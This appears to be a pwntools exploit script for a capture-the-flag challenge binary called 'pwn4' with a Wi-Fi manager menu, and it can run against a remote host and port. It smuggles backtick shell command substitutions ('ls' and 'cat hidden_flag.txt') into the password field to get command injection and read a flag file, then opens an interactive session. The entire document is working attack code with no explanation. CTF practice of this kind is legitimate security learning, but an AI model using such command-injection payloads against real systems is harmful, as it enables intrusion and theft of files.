#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 13337
HOST = "103.197.184.48"
exe = context.binary = ELF('./pwn4', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add_wifi(ssid, password):
    p.sendlineafter(b" > ", str(1))
    p.sendlineafter(b"SSID: ", ssid)
    p.sendlineafter(b"Password: ", password)

def connect_wifi(idx):
    p.sendlineafter(b" > ", str(3))
    p.sendlineafter(b"connect: ", str(idx))
    p.sendlineafter(b"(yes/no) ?: ", b"yes")

add_wifi(b"check_ls", b"`ls`")
connect_wifi(0)

add_wifi(b"d1nhdwc", b"`cat hidden_flag.txt`")
connect_wifi(1)

p.interactive()